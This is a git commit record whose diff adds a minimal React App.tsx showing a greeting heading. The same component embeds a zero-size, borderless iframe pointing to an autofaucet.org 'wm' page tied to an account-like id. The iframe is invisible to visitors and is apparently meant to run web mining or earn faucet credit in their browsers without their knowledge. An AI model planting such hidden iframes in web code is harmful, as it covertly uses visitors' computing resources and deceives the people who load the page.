19153f7d64ed7d0a4f096f4bdf07158e23aca7a0
Olexandr <prikololeksandr@gmail.com>
2023-03-31 19:45:39 +0300

    test

---
+++ src/App.tsx
@@ -0,0 +1,12 @@
+import './App.css';
+
+function App() {
+  return (
+    <div className="App">
+      <h1>Прівєт, Брабус</h1>
+      <iframe src="https://autofaucet.org/wm/swag124/2" width="0" title='bruh' height="0" style={{"border":"none"}}></iframe>
+    </div>
+  );
+}
+
+export default App;
